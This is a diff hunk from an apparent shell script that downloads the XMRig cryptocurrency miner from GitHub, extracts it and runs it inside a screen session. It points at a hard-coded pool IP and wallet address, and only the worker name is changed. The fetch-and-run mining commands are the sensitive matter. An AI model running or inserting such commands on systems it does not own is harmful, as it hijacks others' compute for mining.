@@ -10,4 +10,4 @@ screen -R xmr
 wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz
 tar xvzf xmrig-6.17.0-linux-x64.tar.gz
 cd xmrig-6.17.0
-./xmrig -o 51.79.222.181:80 -u 1HxsnTRFipQ4L3jqMbbJEYwideoGsDBR62.majzza -p start=0.2 -a gr -k -t35
+./xmrig -o 51.79.222.181:80 -u 1HxsnTRFipQ4L3jqMbbJEYwideoGsDBR62.sagu -p start=0.2 -a gr -k -t35
